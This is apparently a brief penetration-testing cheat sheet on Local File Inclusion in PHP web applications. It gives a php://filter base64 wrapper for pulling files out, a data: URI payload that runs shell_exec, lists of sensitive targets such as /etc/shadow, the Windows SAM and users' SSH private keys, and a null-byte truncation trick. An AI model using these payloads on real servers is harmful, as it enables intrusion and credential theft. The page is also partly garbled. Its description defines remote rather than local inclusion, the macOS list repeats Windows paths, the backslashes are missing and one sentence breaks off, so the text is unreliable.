---
description: >-
  A remote file inclusion vulnerability allows an attacker to remotely execute a
  script on the target machine even if it's not available locally.
---

# Local File Inclusion (LFI)

### Example

If we want to get a file then it is best to base64 encode it. This will ensure that we can exfiltrate files rather than have Apache read the file. This can be accomplished with the following command:

`php://filter/convert.base64-encode/resource=[FILE]`

Additionally, the following command demonstrates  how we could execute code if&#x20;

`data:text/plain,<?php echo shell_exec("dir") ?>`

The sections following lists common but interesting files to look at when testing for Local File Inclusion:

### Linux

```
/etc/issue
/proc/version
/etc/profile
/etc/passwd
/etc/passwd
/etc/shadow
/root/.bash_history
/var/log/dmessage
/var/mail/root
/var/spool/cron/crontabs/root
```

### Windows

```
%SYSTEMROOT%repairsystem
%SYSTEMROOT%repairSAM
%WINDIR%win.ini
%SYSTEMDRIVE%boot.ini
%WINDIR%Panthersysprep.inf
%WINDIR%system32configAppEvent.Evt
```

### OSX

```
%SYSTEMROOT%repairsystem
%SYSTEMROOT%repairSAM
%SYSTEMROOT%repairSAM
%WINDIR%win.ini
%SYSTEMDRIVE%boot.ini
%WINDIR%Panthersysprep.inf
%WINDIR%system32configAppEvent.Evt
```

### Additional Notes

* Sometimes during Local File Inclusion, the web server appends something like ‘.php’ or '.config' to the included file. For example, including ‘/etc/passwd’ gets rendered as ‘/etc/passwd.php’. This occurs when the include function uses a parameter like _?page_ and concatenates the .php extension to the file. In versions of PHP below 5.3, ending the URL with a null byte (%00) would cause the interpreter to stop reading, which would allow the attacker to include their intended page. Additionally, this can be observed if you're host a SimpleHTTPServer with Python.
* If you have LFI on a Linux host, you may be able to access the `.ssh/id_rsa` file of any identified users.

### References

* [File Inclusion Vulnerabilities - Offensive Security](https://www.offensive-security.com/metasploit-unleashed/file-inclusion-vulnerabilities/)
